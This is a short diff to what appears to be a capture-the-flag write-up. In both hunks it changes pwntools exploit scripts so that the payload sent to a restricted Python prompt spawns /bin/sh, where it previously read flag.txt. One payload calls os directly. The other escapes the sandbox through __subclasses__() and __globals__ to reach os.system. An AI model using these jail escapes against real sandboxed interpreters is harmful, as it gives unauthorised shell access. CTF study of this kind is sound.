@@ -386,7 +386,7 @@ p.sendline(
 )
 p.recvuntil(b">>> ")
 p.sendline(b"import os")
-p.sendline(b'os.system("cat flag.txt")')
+p.sendline(b'os.system("/bin/sh")')
 p.interactive()
 ```
 
@@ -483,7 +483,7 @@ p.sendline(
     (
         '().__class__.__base__.__subclasses__()['
         + str(printer_index)
-        + '].__init__.__globals__["sys"].modules["os"].system("cat flag.txt")'
+        + '].__init__.__globals__["sys"].modules["os"].system("/bin/sh")'
     ).encode()
 )
 p.interactive()
